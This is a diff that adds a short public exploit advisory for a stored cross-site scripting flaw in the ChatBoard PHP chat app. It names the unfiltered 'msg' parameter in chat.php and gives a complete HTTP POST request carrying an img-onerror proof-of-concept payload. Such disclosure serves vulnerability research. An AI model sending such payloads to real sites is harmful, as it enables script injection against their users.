@@ -1,0 +1,28 @@
+# Exploit Title: Ultrabenosaurus ChatBoard - Stored XSS
+# Date: 2016-06-14
+# Exploit Author: HaHwul
+# Exploit Author Blog: www.hahwul.com
+# Vendor Homepage: http://ultrabenosaurus.ninja/
+# Software Link: https://github.com/Ultrabenosaurus/ChatBoard/archive/master.zip
+# Tested on: Debian [wheezy]
+
+### Vulnerability Point
+chat.php is not filtering special character
+ -> file: ./chat.php
+ -> param: msg
+
+### Vulnerability Code
+POST /vul_test/ChatBoard/__original/chat.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://127.0.0.1/vul_test/ChatBoard/__original/?chat
+Content-Length: 10
+Cookie: PHPSESSID=3oecem8o5c8975dcufbb0moqn5
+Connection: keep-alive
+
+msg=654<img src="z" onerror=zz>asd
